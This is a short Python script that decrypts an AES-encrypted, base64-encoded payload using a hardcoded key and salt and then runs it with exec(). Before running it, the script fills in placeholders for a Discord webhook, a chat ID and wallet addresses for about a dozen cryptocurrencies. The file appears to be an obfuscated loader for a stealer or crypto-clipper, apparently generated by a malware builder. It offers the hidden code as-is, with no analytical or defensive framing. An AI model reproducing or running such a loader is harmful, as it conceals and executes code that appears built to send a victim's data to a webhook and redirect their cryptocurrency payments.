
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA512
from Crypto.Util.Padding import unpad

def decrypt(encdata, masterkey, salt):
    encdata_bytes = base64.b64decode(encdata)
    salt_bytes = base64.b64decode(salt)
    iv = encdata_bytes[:16]
    ciphertext_bytes = encdata_bytes[16:]
    key = PBKDF2(masterkey.encode('utf-8'), salt_bytes, dkLen=32, count=1000000, hmac_hash_module=SHA512)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_bytes = cipher.decrypt(ciphertext_bytes)
    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode('utf-8')
    return decrypted_text

decrypted = decrypt("l1uM3vcnMqSSPNqjdyjoUJOCsEQkBZ+0T0w+82s//ZfmJRNMDAEaaiJZDDYg+SLHqe0zrGXrpFzoedza+/729cLbyTtyAUeur3ORqQXoelvNfAtZ8nKmqxFda2134CS6wAZGiNXX38K3E5yVbOumEzDhbCY8qjXi360kg1U0mcJ494veChdf1Twexw/ggu6ETbtf7akXCm77lpFhUAZ81VsdOUgsIGoalUy9vUOiHC/rGA5z8oLnh8ogzafEMWOMs4vyfO3gNZdhIJNcvr+ZsukrZRM8liGZeO37DUT+UdGdYJE9PkcsYnQ+m+9GkMbwzA/byQ69VRPY/AlFFBv6CXmXYAXXFwpTcz5MVwB3aNfpDbDjMlPVJ1V3NkJkRb472KfIvG5aX5NIG/cL+0MiiYXsbL24P5kAt2Uh8q+wJibKMPTZiC7zggvXau1EdQJcSz/qre48DGHdYqC7271MYiG6EODwpPVHOmBsJ+TpQS4IrsMdPb5HrxpUcJER+CZUTh8R9h86ShG5Z/NzCsNNHiR3CUAUvUh46U+JUOkap532AOXKKqQJPY80R4rLoGJfvcLWfkmSw7xgNYX3gxNVoYIQ/QANjDsOCLZBYuuUFMSXSyZxtRkamCmA3rCeD26YBkYdJuphzftZRgdfNpkKGqfF5OUAj3deH2n6e5AOaNckZISRrgAeD28slXfccUIwKUwlmC97nseKNdNSOKjz8FgEbxCSXMy1RtbVwRXQChgUu78IUBOKxJyBs8nh/aCdgcD7rBRh8MvftkImwRMdbzmZh4YmRNNWHpNISgnZmg/M3a7LvGY27noGJp3RRDc0DdO3+gE9JTdPTS12k4X+cg==", "43397f32c0e2f6323ad4d5747ec68a4675f3eef33af5569132f08e1c1ab73866", "GzD4RKZ2Kvg0u93JdguHrw==")
exec(decrypted.replace("%WEBHOOKURL%", "%DISCORD%").replace("%CHATID%", "%USERID%").replace("%BTCADDRESS%", "%ADDRESSBTC%").replace("%ETHADDRESS%", "%ADDRESSETH%").replace("%DOGEADDRESS%", "%ADDRESSDOGE%").replace("%LTCADDRESS%", "%ADDRESSLTC%").replace("%XMRADDRESS%", "%ADDRESSXMR%").replace("%BCHADDRESS%", "%ADDRESSBCH%").replace("%DASHADDRESS%", "%ADDRESSDASH%").replace("%TRXADDRESS%", "%ADDRESSTRX%").replace("%XRPADDRESS%", "%ADDRESSXRP%").replace("%XLMADDRESS%", "%ADDRESSXLM%").replace("%SHOWERROR%", "%ERRORSTATUS%"))
